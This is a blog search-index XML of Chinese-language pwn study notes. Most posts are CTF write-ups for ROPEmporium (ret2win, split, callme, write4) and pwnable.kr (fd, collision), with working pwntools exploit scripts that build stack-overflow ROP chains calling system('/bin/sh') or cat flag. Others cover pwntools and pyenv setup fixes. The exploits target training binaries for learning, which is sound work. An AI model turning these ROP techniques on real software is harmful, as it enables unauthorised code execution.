<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ROPEmporium write4</title>
      <link href="/2020/04/18/write4/"/>
      <url>/2020/04/18/write4/</url>
      
        <content type="html"><![CDATA[<p>z这个challenge的主要点是将数据写入内存再把内存地址传递给rdi。</p><a id="more"></a><p><strong>环境：</strong> ubuntu18.04 、 pwntools(py3)</p><p><strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">'write4'</span>) <span class="comment">#文件名</span></span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"></span><br><span class="line">data_seg = p64(<span class="number">0x601000</span>)</span><br><span class="line">systemad = p64(<span class="number">0x4005e0</span>)</span><br><span class="line">pop_r14_r15 = p64(<span class="number">0x400890</span>)</span><br><span class="line">shstr = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">movstr = p64(<span class="number">0x400820</span>)</span><br><span class="line">retad = p64(<span class="number">0x400806</span>)</span><br><span class="line">poprdi = p64(<span class="number">0x400893</span>)</span><br><span class="line"></span><br><span class="line">payload = bytes(<span class="string">'A'</span>,<span class="string">'latin-1'</span>) * <span class="number">40</span> <span class="comment"># padding</span></span><br><span class="line">payload += pop_r14_r15</span><br><span class="line">payload += data_seg</span><br><span class="line">payload += bytes(shstr,<span class="string">'latin-1'</span>)</span><br><span class="line">payload += movstr</span><br><span class="line">payload += poprdi</span><br><span class="line">payload += data_seg</span><br><span class="line">payload += retad</span><br><span class="line">payload += systemad</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>惯例system前调用一次ret对齐内存=-= </p><p>以上</p><p><img src="https://i.loli.net/2020/04/18/phEDjvzM7nCeNRA.png" alt="image-20200418101056821"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROPEmporium </tag>
            
            <tag> write4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROPEmporium callme</title>
      <link href="/2020/04/17/callme/"/>
      <url>/2020/04/17/callme/</url>
      
        <content type="html"><![CDATA[<h2 id="Callme"><a href="#Callme" class="headerlink" title="Callme"></a>Callme</h2><p>这个题没什么好说的。直接找gadget进行构造就行了。</p><a id="more"></a><p><strong>环境：</strong> ubuntu18.04 、 pwntools(py3)</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">'callme'</span>) <span class="comment">#文件名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#info('%#X system', elf.symbols.system)</span></span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"></span><br><span class="line">gadget = p64(<span class="number">0x401ab0</span>)</span><br><span class="line"></span><br><span class="line">ca_one = p64(<span class="number">0x401850</span>)</span><br><span class="line">ca_two = p64(<span class="number">0x401870</span>)</span><br><span class="line">ca_thr = p64(<span class="number">0x401810</span>)</span><br><span class="line">ret_ad = p64(<span class="number">0x401ab3</span>)</span><br><span class="line"></span><br><span class="line">arg_st = p64(<span class="number">1</span>)</span><br><span class="line">arg_nd = p64(<span class="number">2</span>)</span><br><span class="line">arg_rd = p64(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">arg_al = arg_st + arg_nd + arg_rd</span><br><span class="line"></span><br><span class="line">callThem = ret_ad + gadget + arg_al</span><br><span class="line"><span class="comment"># ubuntu18.04一定要加ret_ad.否则system函数出错会打印不出来flag</span></span><br><span class="line"></span><br><span class="line">payload = bytes(<span class="string">'A'</span>,<span class="string">'latin-1'</span>) * <span class="number">40</span> <span class="comment"># padding</span></span><br><span class="line">payload += callThem</span><br><span class="line">payload += ca_one</span><br><span class="line">payload += callThem</span><br><span class="line">payload += ca_two</span><br><span class="line">payload += callThem</span><br><span class="line">payload += ca_thr</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">flag = io.recvall()</span><br><span class="line">print(<span class="string">'FLAG: '</span> + str(flag,<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/17/d9ubTipt3MagkC8.png" alt="image-20200417214303357"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROPEmporium </tag>
            
            <tag> callme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROPEmporium split</title>
      <link href="/2020/04/16/split/"/>
      <url>/2020/04/16/split/</url>
      
        <content type="html"><![CDATA[<h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><p>上一次的坑这一次碰到了，<a href="/2020/04/13/ret2win/" title="ROPEmporium ret2win">ROPEmporium ret2win</a>里面说当时函数无法成功运行，搜索的结果是十六进制对齐的问题。在那个问题里因为限定了读取的长度为50，而要进行对其至少要40 + 8*3 已经超过了。在这次遇到了这个问题</p><a id="more"></a><p><strong>环境：</strong> ubuntu18.04 、 pwntools(py3)</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">'split'</span>)</span><br><span class="line"></span><br><span class="line">info(<span class="string">'%#X system'</span>, elf.symbols.system)</span><br><span class="line">system = p64(elf.symbols.system)</span><br><span class="line"></span><br><span class="line">print_flag = p64(elf.symbols.usefulString)</span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"></span><br><span class="line">payload = bytes(<span class="string">'A'</span>,<span class="string">'latin-1'</span>) * <span class="number">40</span> <span class="comment"># padding</span></span><br><span class="line">payload += p64(<span class="number">0x400884</span>) <span class="comment"># ret; 16进制对其</span></span><br><span class="line">payload += p64(<span class="number">0x400883</span>) <span class="comment"># gadget: pop rdi;ret</span></span><br><span class="line">payload += p64(<span class="number">0x601060</span>) <span class="comment"># '/bin/cat flag'</span></span><br><span class="line">payload += p64(<span class="number">0x4005e0</span>) <span class="comment"># systemaddr</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">flag = io.recvall()</span><br><span class="line">print(<span class="string">'FLAG: '</span> + str(flag,<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p>python3 版本的pwntools。</p><p>其中str转bytes处要用latin-1编码，是py3和py2的区别。</p><p>在gadget之前要添加一个ret，这里是ubuntu18.04的内存对齐问题。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROPEmporium </tag>
            
            <tag> split </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwntools的一些坑</title>
      <link href="/2020/04/13/Pwntools%20%E4%B8%80%E4%BA%9B%E5%9D%91/"/>
      <url>/2020/04/13/Pwntools%20%E4%B8%80%E4%BA%9B%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>最近刚开始学习pwn，因为看到有python3版本的pwntools。就安了一下，记录一下目前遇到的坑。</p><blockquote><ol><li><p>_curses moudle not found</p></li><li><p>TypeError：can only concatenate str</p></li></ol></blockquote><a id="more"></a><h2 id="一、-curses"><a href="#一、-curses" class="headerlink" title="一、_curses"></a>一、_curses</h2><p>搜索了很多，都是windows下python缺少_curses库的，显然wsl无法用这个方法解决。最后终于找到一个解决方案，链接如下</p><blockquote><p><a href="https://my.oschina.net/leejun2005/blog/167567" target="_blank" rel="noopener">https://my.oschina.net/leejun2005/blog/167567</a></p></blockquote><h3 id="针对linux的方案："><a href="#针对linux的方案：" class="headerlink" title="针对linux的方案："></a>针对linux的方案：</h3><ol><li><p>sudo pip install curses-2048</p></li><li><p>动态链接库(_curses_panel.so<br>_curses.so)的位置不对或者没有创建动态链接库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">find / -iname <span class="string">"_curses*.so"</span> 2&gt;/dev/null</span><br><span class="line">/usr/lib64/python2.6/lib-dynload/_curses.so</span><br><span class="line">/usr/lib64/python2.6/lib-dynload/_curses_panel.so</span><br><span class="line"></span><br><span class="line">find / 2&gt;/dev/null | grep <span class="string">'python2.7/lib-dynload'</span>|head -2 </span><br><span class="line">/opt/soft/python-2.7.11/lib/python2.7/lib-dynload</span><br><span class="line">/opt/soft/python-2.7.11/lib/python2.7/lib-dynload/math.so</span><br><span class="line"></span><br><span class="line">cp /usr/lib64/python2.6/lib-dynload/_curses*.so /usr/<span class="built_in">local</span>/lib/python2.7/lib-dynload/</span><br><span class="line"></span><br><span class="line">find / -iname <span class="string">"_curses*.so"</span> 2&gt;/dev/null</span><br><span class="line">/usr/lib64/python2.6/lib-dynload/_curses_panel.so</span><br><span class="line">/usr/lib64/python2.6/lib-dynload/_curses.so</span><br><span class="line">/usr/<span class="built_in">local</span>/lib/python2.7/lib-dynload/_curses_panel.so</span><br><span class="line">/usr/<span class="built_in">local</span>/lib/python2.7/lib-dynload/_curses.so</span><br></pre></td></tr></table></figure><p>这样就能让python找到相应的so文件。</p></li></ol><h2 id="二、TypeError"><a href="#二、TypeError" class="headerlink" title="二、TypeError"></a>二、TypeError</h2><p>python3里<strong>bytes</strong>类型和<strong>str</strong>类型是两个不同的类型，而不是像py2里面作为同一个类型的两个名字。因此在诸如<code>”A“ * N + p64(Addr)</code>这种形势的payload构造时，会出现问题。</p><p>查了好久发现在pwntools github的issue中有一个解答。</p><p>对所有要 xx.send()的字符串 要用<code>&#39;latin-1&#39;</code>进行编码。将其变成bytes类型后进行拼接。</p><p>最后的结果就是</p><p><code>bytes(&quot;A&quot;, &#39;latin-1&#39;) * N + p64(Addr)</code></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwntools </tag>
            
            <tag> _curses </tag>
            
            <tag> 编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这里是一个置顶帖w</title>
      <link href="/2020/04/13/Top/"/>
      <url>/2020/04/13/Top/</url>
      
        <content type="html"><![CDATA[<p>基本上是用来做一个todolist的，emmm就这样啦</p><a id="more"></a><h2 id="TO-DO"><a href="#TO-DO" class="headerlink" title="TO-DO"></a>TO-DO</h2><div class='checkbox red checked'><input type="checkbox" checked="checked"/>            <p>Ubuntu 18.04下pwn相关细节</p>            </div><blockquote><details ><summary> <p>问题已解决</p> </summary>              <div class='content'>              <blockquote><ol><li><a href="http://homura.cc/blog/archives/168" target="_blank" rel="noopener">http://homura.cc/blog/archives/168</a></li><li>[<a href="https://ropemporium.com/guide.html#Common%20pitfalls]" target="_blank" rel="noopener">https://ropemporium.com/guide.html#Common%20pitfalls]</a>(<a href="https://ropemporium.com/guide.html#Common" target="_blank" rel="noopener">https://ropemporium.com/guide.html#Common</a> pitfalls)</li><li>除了在<a href="/2020/04/13/ret2win/" title="ROPEmporium ret2win">ROPEmporium ret2win</a>中遇到的跳转函数后遇到的printf处抛出vprintf no such file以外。直接跳转到system等均未出问题。</li></ol><p>—————20-04-14——————</p><ol start="4"><li><a href="/2020/04/16/split/" title="ROPEmporium split">ROPEmporium split</a>在这个题目中，可以对ubuntu18.04的对齐坑有一定的理解了。</li></ol><p>—————20-04-16——————</p></blockquote>              </div>            </details></blockquote><div class='checkbox blue'><input type="checkbox" />            <p>对pwn大概路线的了解</p>            </div><blockquote><details ><summary> <p>Read list</p> </summary>              <div class='content'>              <blockquote><h6 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h6><div class='checkbox blue'><input type="checkbox" />            <ol><li><a href="https://paper.seebug.org/481/" target="_blank" rel="noopener">https://paper.seebug.org/481/</a></li></ol>            </div></blockquote>              </div>            </details></blockquote><div class='checkbox cyan'><input type="checkbox" />            <p>ret2csu</p>            </div><blockquote><p>ROPEmporium</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ROPEmporium ret2win</title>
      <link href="/2020/04/13/ret2win/"/>
      <url>/2020/04/13/ret2win/</url>
      
        <content type="html"><![CDATA[<h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><p>整个过程遇到了许多的坑，系统是ubuntu 18.04.</p><a id="more"></a><p><strong>环境：</strong> ubuntu18.04 、 pwntools(py3)</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><blockquote><p><a href="https://ropemporium.com/challenge/ret2win.html" target="_blank" rel="noopener">https://ropemporium.com/challenge/ret2win.html</a></p></blockquote><p>checksec</p><p><img src="https://i.loli.net/2020/04/13/uW1I7QOGf5B3aq9.png" alt="image-20200413103432122"></p><p>r2</p><p><img src="https://i.loli.net/2020/04/13/Aiw4HRZID8yGfpK.png" alt="image-20200413103753525"></p><p>发现是fgets</p><p><img src="https://i.loli.net/2020/04/13/jOLK3wlnsfJcbTI.png" alt="image-20200413103911513"></p><p>可以看出来要ret到这个函数里面</p><p>gdb</p><p><img src="https://i.loli.net/2020/04/13/VKAMJZ8t3bWFLsx.png" alt="image-20200413104216804"></p><p><img src="https://i.loli.net/2020/04/13/Utjrz4REmhTYqla.png" alt="image-20200413104400096"></p><p>padding应该有40位。</p><p>构造相应的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">'./ret2win'</span>)</span><br><span class="line">info(<span class="string">'%#x target'</span>, elf.symbols.ret2win)</span><br><span class="line"></span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="comment"># ret2win = p64(elf.symbols.ret2win)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">40</span> + p64(<span class="number">0x400824</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">flag=io.recvall()</span><br><span class="line">success(flag)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/13/GEvNs2xaceT8nQl.png" alt="image-20200413104630237"></p><h3 id="一个坑"><a href="#一个坑" class="headerlink" title="一个坑"></a>一个坑</h3><p>ubuntu18.04下 覆盖的ret地址不能是ret2win的函数开始地址，应该是对应的system地址。</p><p>原因好像是18.04在内存对齐上有特殊的要求，等研究好了这里会补充</p><blockquote><p><a href="https://ropemporium.com/guide.html#Common%20pitfalls" target="_blank" rel="noopener">https://ropemporium.com/guide.html#Common%20pitfalls</a></p></blockquote><p><strong>问题原理：</strong><a href="http://homura.cc/blog/archives/168" target="_blank" rel="noopener">http://homura.cc/blog/archives/168</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ROPEmporium </tag>
            
            <tag> ret2win </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnalbe.kr C2.collision WP</title>
      <link href="/2020/04/09/Pwnable%202/"/>
      <url>/2020/04/09/Pwnable%202/</url>
      
        <content type="html"><![CDATA[<h2 id="Pwnalbe-kr-C2-collision-WP"><a href="#Pwnalbe-kr-C2-collision-WP" class="headerlink" title="Pwnalbe.kr C2.collision WP"></a>Pwnalbe.kr C2.collision WP</h2><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码如上</p><p>核心思路就是要一个五个字符的passcode。Sum[passcode] = 0x21DD09EC</p><p>那么就直接构造4个小的最后再用合减去就有了第五个字符。</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./col `python -c <span class="string">"print('\x01\x01\x01\x01'*4+'\xe8\x05\xd9\x1d')"</span>`</span></span><br></pre></td></tr></table></figure><p>​    </p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable.kr </tag>
            
            <tag> fd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnalbe.kr C1.fd WP</title>
      <link href="/2020/04/09/Pwnable%20fd/"/>
      <url>/2020/04/09/Pwnable%20fd/</url>
      
        <content type="html"><![CDATA[<h2 id="Pwnalbe-kr-C1-fd-WP"><a href="#Pwnalbe-kr-C1-fd-WP" class="headerlink" title="Pwnalbe.kr C1.fd WP"></a>Pwnalbe.kr C1.fd WP</h2><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = <span class="built_in">read</span>(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要让fd = 0 就可以把flag打印到标准输出了。</p><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./fd 4660</span></span><br><span class="line">LETMEWIN</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/09/4ZNxbSCIufmdyV9.png" alt="image-20200409172141326"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwnable.kr </tag>
            
            <tag> fd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pyenv相关安装问题</title>
      <link href="/2020/04/09/pyenv%E7%9B%B8%E5%85%B3%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98/"/>
      <url>/2020/04/09/pyenv%E7%9B%B8%E5%85%B3%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="pyenv相关安装问题"><a href="#pyenv相关安装问题" class="headerlink" title="pyenv相关安装问题"></a>pyenv相关安装问题</h2><h3 id="1-pyenv-install-下载慢"><a href="#1-pyenv-install-下载慢" class="headerlink" title="1. pyenv install 下载慢"></a>1. pyenv install 下载慢</h3><h4 id="1-代理"><a href="#1-代理" class="headerlink" title="1. 代理"></a>1. 代理</h4><p>命令行可以用<strong><em>proxychains-ng</em></strong></p><h4 id="2-pyenv-cache"><a href="#2-pyenv-cache" class="headerlink" title="2.  ~/.pyenv/cache"></a>2.  ~/.pyenv/cache</h4><p>将要安装的版本的.gz包从官网下载之后放进<code>~/.pyenv/cache</code>再pyenv install就可以安装了</p><a id="more"></a><h3 id="2-依赖"><a href="#2-依赖" class="headerlink" title="2. 依赖"></a>2. 依赖</h3><h4 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install make build-essential libssl-dev zlib1g-dev</span><br><span class="line">sudo apt-get install libbz2-dev libreadline-dev libsqlite3-dev wget curl</span><br><span class="line">sudo apt-get install llvm libncurses5-dev libncursesw5-dev</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> config </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pyenv </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
